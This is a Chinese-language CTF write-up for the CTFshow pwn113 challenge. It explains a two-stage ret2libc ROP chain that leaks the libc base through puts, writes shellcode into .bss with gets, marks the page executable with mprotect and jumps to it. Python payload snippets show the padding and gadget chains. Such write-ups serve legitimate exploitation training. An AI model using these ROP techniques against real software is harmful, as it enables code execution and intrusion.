---
title: CTFshow pwn113 ret2libc + mprotect
published: 2026-04-17
updated: 2026-04-17
description: 两段式利用，先 leak puts 算 libc，再调 gets 和 mprotect 把可写段改成可执行，最后灌 shellcode 读 flag。
tags: [CTFshow, Pwn, Stack, ROP, Ret2Libc, Mprotect]
category: ctfshow
draft: false
---

# 题目结论

这题已经不是单纯 ret2text，而是完整的两段式 ROP。

第一段先泄露 `puts@got` 拿到 libc 基址。第二段调用 `gets` 把 shellcode 写入 `.bss`，再调用 `mprotect` 把对应页改成 `rwx`，最后跳过去执行读 flag 的 shellcode。

## 利用链

1. `pop rdi; ret` 把 `puts@got` 传给 `puts@plt`
2. 返回 `main`，让程序重新进入可控状态
3. 根据泄露值计算 `libc_base`
4. 用 ROP 调 `gets(data)` 往 `.bss` 写 shellcode
5. 调 `mprotect(data_page, 0x1000, 7)`
6. 跳转到 `data`

## 关键 exp 片段

```python
payload = b"A" * 0x418 + p8(0x28)
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_ret)
sl(payload)
```

```python
payload = b"A" * 0x418 + p8(0x28) + p64(pop_rdi_ret) + p64(data)
payload += p64(gets_addr)
payload += p64(pop_rdi_ret) + p64(data)
payload += p64(pop_rsi) + p64(0x1000) + p64(pop_rdx) + p64(7)
payload += p64(mprotect_addr) + p64(data)
sl(payload)
```

## 下载

- [下载题目附件 `pwn`](../../../attachments/ctfshow/pwn113/pwn)
- [下载利用脚本 `程序流分析.py`](../../../attachments/ctfshow/pwn113/程序流分析.py)
- [下载原始笔记 `Bypass_pwn113.md`](../../../attachments/ctfshow/pwn113/Bypass_pwn113.md)
- [下载题目附带 libc 包 `libc6_2.27-3ubuntu1_amd64.deb`](../../../attachments/ctfshow/pwn113/libc6_2.27-3ubuntu1_amd64.deb)

## 适合记住的点

当题目既不给 system，也不方便 one_gadget 时，`leak libc -> gets shellcode -> mprotect -> jump` 是一条很通用的备用路线。
